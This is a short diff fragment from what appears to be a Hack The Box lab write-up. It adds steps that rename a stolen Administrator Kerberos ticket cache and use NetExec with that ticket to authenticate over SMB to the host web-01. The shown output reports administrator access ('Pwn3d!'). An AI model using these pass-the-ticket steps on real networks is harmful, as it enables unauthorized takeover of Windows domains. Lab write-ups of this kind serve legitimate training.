@@ -1029,7 +1029,18 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 
 I now have a TGT for the administrator
 
+```python
+mv Administrator.ccache administrator-web-01.ccache
 
+```
+
+Ill export he TGT
+
+```python
+nxc smb web-01.darkcorp.htb --use-kcache 
+SMB         web-01.darkcorp.htb 445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
+SMB         web-01.darkcorp.htb 445    WEB-01           [+] DARKCORP.HTB\Administrator from ccache (Pwn3d!)
+```
 
 
 
